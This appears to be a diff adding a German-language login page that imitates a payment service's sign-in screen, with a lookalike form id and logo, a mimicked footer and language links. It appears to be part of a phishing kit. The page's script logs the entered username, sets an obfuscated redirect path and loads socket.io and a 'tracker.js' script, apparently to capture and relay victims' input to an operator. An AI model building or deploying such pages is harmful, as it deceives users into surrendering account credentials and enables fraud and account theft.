@@ -1,0 +1,129 @@
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/css/index.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+
+</head>
+
+<body>
+    <header>
+
+    </header>
+    <main>
+        <form method="post" id="PP-Login">
+            <div class="logo">
+                <img src="./img/pipillgomark.png" alt="">
+            </div>
+            <div class="input-container">
+                <input required="" id="username" name="username" type="text">
+                <label class="label" for="username">E-Mail-Adresse oder Handynummer</label>
+                <div class="underline"></div>
+                <div id="errorMessage" style="color: #d01a1a; font-size: 12px; margin-top: 5px; display: none;">Bitte
+                    geben Sie Ihre E-Mail-Adresse oder Mobiltelefonnummer ein.</div>
+            </div>
+            <div class="bot">
+                <div class="first">
+                    <p>E-Mail vergessen?</p>
+                    <button class="btn" type="submit">Einloggen</button>
+                </div>
+                <div class="mid">
+                    <hr>
+                    <span>oder</span>
+                    <hr>
+                </div>
+                <div class="second">
+                    <a href="">Neu anmelden</a>
+                </div>
+                <div class="third">
+                    <a href="">Arabisch</a>
+                    <hr>
+                    <a href="" class="active">Englisch</a>
+                    <hr>
+                    <a href="">Französisch</a>
+                    <hr>
+                    <a href="">Spanisch</a>
+                    <hr>
+                    <a href="">Chinesisch</a>
+                </div>
+            </div>
+        </form>
+    </main>
+    <footer>
+        <p>Kontakt</p>
+        <p>Datenschutz</p>
+        <p>Rechtliches</p>
+        <p>Richtlinienupdates</p>
+        <p>Weltweit</p>
+    </footer>
+
+    <script>
+        function validateEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        function validatePhoneNumber(phone) {
+            // Remove spaces, dashes, and other non-numeric characters
+            const cleanPhone = phone.replace(/[\s\-\(\)\.]/g, '');
+            // Check for valid phone formats (starts with + or digits, 7-15 digits)
+            const phoneRegex = /^(\+?[0-9]{7,15})$/;
+            return phoneRegex.test(cleanPhone);
+        }
+
+        document.getElementById('PP-Login').addEventListener('submit', function (e) {
+            e.preventDefault();
+            console.log("submit");
+            const username = document.getElementById('username').value.trim();
+            const errorMessage = document.getElementById('errorMessage');
+
+            if (!username) {
+                errorMessage.textContent = 'Bitte geben Sie Ihre E-Mail-Adresse oder Mobiltelefonnummer ein.';
+                errorMessage.style.display = 'block';
+                return;
+            }
+
+            // Allow usernames without @ symbols, validate email/phone only if @ is present
+            const hasAtSymbol = username.includes('@');
+            let isValid = true;
+
+            if (hasAtSymbol) {
+                isValid = validateEmail(username);
+            } else {
+                // For usernames without @, allow any non-empty value
+                isValid = username.length > 0;
+            }
+
+            if (!isValid) {
+                errorMessage.textContent = hasAtSymbol ?
+                    'Bitte geben Sie eine gültige E-Mail-Adresse ein.' :
+                    'Bitte geben Sie einen gültigen Benutzernamen ein.';
+                errorMessage.style.display = 'block';
+                return;
+            }
+
+            // Hide error message if validation passes
+            errorMessage.style.display = 'none';
+            console.log('Login attempt:', { username });
+
+            const form = document.getElementById('PP-Login');
+            form.setAttribute('data-redirect', '/loadPPxCvGk6Hb?time=3&url=PasoPPIkjnUHnKJHu');
+        });
+
+        // Also hide error message when user starts typing
+        document.getElementById('username').addEventListener('input', function () {
+            const errorMessage = document.getElementById('errorMessage');
+            if (errorMessage) {
+                errorMessage.style.display = 'none';
+            }
+        });
+    </script>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="js/tracker.js"></script>
+
+</body>
+
+</html>
